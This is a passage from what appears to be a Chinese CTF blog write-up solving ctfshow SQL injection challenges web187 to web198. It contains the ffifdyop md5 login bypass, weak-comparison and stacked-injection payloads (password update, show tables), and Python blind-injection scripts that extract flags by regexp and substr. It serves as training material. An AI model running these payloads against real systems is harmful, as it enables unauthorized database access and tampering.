class="keyword">die</span>(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>登陆窗口，看返回逻辑</li>
</ul>
</blockquote>
<p><strong>很明显注入点是md5()函数这里，后面用了参数true，返回的是一个16位二进制</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730155322904.png" alt="image-20210730155322904"></p>
<p>网上有一个字符串<code>ffifdyop</code>很特殊</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5(<span class="string">"ffifdyop"</span>,<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="string">'or'</span><span class="number">6</span>�]��!r,��b</span><br><span class="line"> 刚好成万能密码</span><br><span class="line">  password=<span class="string">''</span><span class="keyword">or</span> <span class="keyword">true</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730155234977.png" alt="image-20210730155234977"></p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> $sql = "<span class="keyword">select</span> pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username = &#123;$username&#125;<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//密码判断</span></span><br><span class="line"><span class="string">  if($row['pass']==intval($password))&#123;</span></span><br><span class="line"><span class="string">      $ret['msg']='登陆成功';</span></span><br><span class="line"><span class="string">      array_push($ret['data'], array('flag'=&gt;$flag));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到是通过username来列出密码，然后弱比较来进行判断payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&amp;password=0</span><br></pre></td></tr></table></figure></div>

<p><strong>以这道题的数据库为例，这个数据库中的用户名都是以字母开头的数据，而以字母开头的数据在和数字比较时，会被强制转换为0，因此就会相等，后面的pass也是一样的道理</strong><br><strong>但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用<code>||</code>运算符</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure></div>

<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p><strong>因为确定一定包含ctfshow这个内容，所以通过load_file的返回值“\u67e5\u8be2\u5931\u8d25”判断是否存在，写个payload</strong></p>
<blockquote>
<p><strong>LOAD_FILE(file_name)：</strong> 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。</p>
<p><strong>regexp：</strong> mysql中的正则表达式操作符</p>
</blockquote>
<p><strong>容易想到默认路径是<code>/var/www/html/api/index.php</code>，开始写个脚本进行盲注</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://e89f25b2-8acb-4c79-8368-56f445f77e6c.challenge.ctf.show:8080/api/index.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;"</span></span><br><span class="line">flag = <span class="string">"ctfshow&#123;"</span></span><br><span class="line">payload=<span class="string">"if(load_file('/var/www/html/api/index.php')regexp('&#123;0&#125;'),1,0)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">666</span>):</span><br><span class="line">    print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"username"</span>:payload.format(flag + j),</span><br><span class="line">            <span class="string">"password"</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u67e5\u8be2\u5931\u8d25"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'&#125;'</span>:</span><br><span class="line">            print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730180926218.png" alt="image-20210730180926218"></p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><blockquote>
<p>经典盲注，脚本跑</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://17f404c9-b645-40ab-8daf-f60c335e2d84.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890-=!@#$%^&amp;*()_+`~ qwertyuiopasdfghjklzxcvbnm[];,./&#123;&#125;:&lt;&gt;?\|"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表 payload="admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"><span class="comment">#查字段 payload="admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(i,j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730190843467.png" alt="image-20210730190843467"></p>
</blockquote>
<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><blockquote>
<ul>
<li>和上题一样，过滤了ascii等，不过我写的payload没用</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://17f404c9-b645-40ab-8daf-f60c335e2d84.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890-=!@#$%^&amp;*()_+`~ qwertyuiopasdfghjklzxcvbnm[];,./&#123;&#125;:&lt;&gt;?\|"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表 payload="admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"><span class="comment">#查字段 payload="admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(i,j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730191215328.png" alt="image-20210730191215328"></p>
</blockquote>
<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><blockquote>
<ul>
<li>和上题一样，没办=号，我们依旧潇洒</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8ab877db-cd5c-424f-bb9c-0f54ba6447c7.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890-=!@#$%^&amp;*()_+`~ qwertyuiopasdfghjklzxcvbnm[];,./&#123;&#125;:&lt;&gt;?\|"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表 payload="admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"><span class="comment">#查字段 payload="admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(i,j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> res.json()[<span class="string">'msg'</span>]:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><blockquote>
<ul>
<li>过滤了substr但是没有过滤正则啊，用正则^来匹配第一个</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://131ffba2-a367-4469-8421-e4c0d9877e37.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表payload="admin' and if((select group_concat(table_name) from information_schema.tables where table_schema=database())regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line"><span class="comment">#查字段payload="admin' and if((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flxg')regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if((select group_concat(f1ag) from ctfshow_flxg)regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(flag+j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> res.json()[<span class="string">'msg'</span>]:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730210312414.png" alt="image-20210730210312414"></p>
<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><blockquote>
<ul>
<li>正则依旧没有被办，只是办了个右连接等，继续上个脚本梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8f2766ad-af45-441e-b247-7a526b3d150f.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表payload="admin' and if((select group_concat(table_name) from information_schema.tables where table_schema=database())regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line"><span class="comment">#查字段payload="admin' and if((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flxg')regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if((select group_concat(f1ag) from ctfshow_flxg)regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(flag+j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> res.json()[<span class="string">'msg'</span>]:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730210650528.png" alt="image-20210730210650528"></p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   //拼接sql语句查找指定ID用户</span><br><span class="line"> $sql = "<span class="keyword">select</span> pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username = &#123;$username&#125;;";</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line"> if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username))&#123;</span><br><span class="line">   $ret['msg']='用户名非法';</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>过滤了空格，用反引号来代替，因为提示堆叠注入，我们考虑用update更新密码，因为sql语句中没有单引号包含，无法成功执行，所以得将admin转十六进制进行执行</li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x61646d696e;<span class="keyword">update</span><span class="string">`ctfshow_user`</span><span class="keyword">set</span><span class="string">`pass`</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><strong>接着用0x61646d696e，123456登陆就行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730211627435.png" alt="image-20210730211627435"></p>
</blockquote>
<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line">if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username))&#123;</span><br><span class="line">  $ret['msg']='用户名非法';</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($username)&gt;16)&#123;</span><br><span class="line">  $ret['msg']='用户名不能超过16个字符';</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>多限制了用户名的长度，这里注意正则里ban的是se1ect，二不是select，所以select可以继续使用</strong></p>
<ul>
<li><strong>payload</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:1;<span class="keyword">select</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">password</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730212125349.png" alt="image-20210730212125349"></p>
</blockquote>
<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line">if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username))&#123;</span><br><span class="line">  $ret['msg']='用户名非法';</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($row[0]==$password)&#123;</span><br><span class="line">    $ret['msg']="登陆成功 flag is $flag";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里在195的基础上ban了update和set等，不过这里没有ban掉show，我们可以在username把表全部查询出来，在password里传入表名，相等即可符合判断条件爆出flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：520;show tables</span><br><span class="line">password：ctfshow_user</span><br></pre></td></tr></table></figure></div>

<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><blockquote>
<ul>
<li>上题方法依旧可以做，我们换种思路,这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下</li>
</ul>
</blockquote>
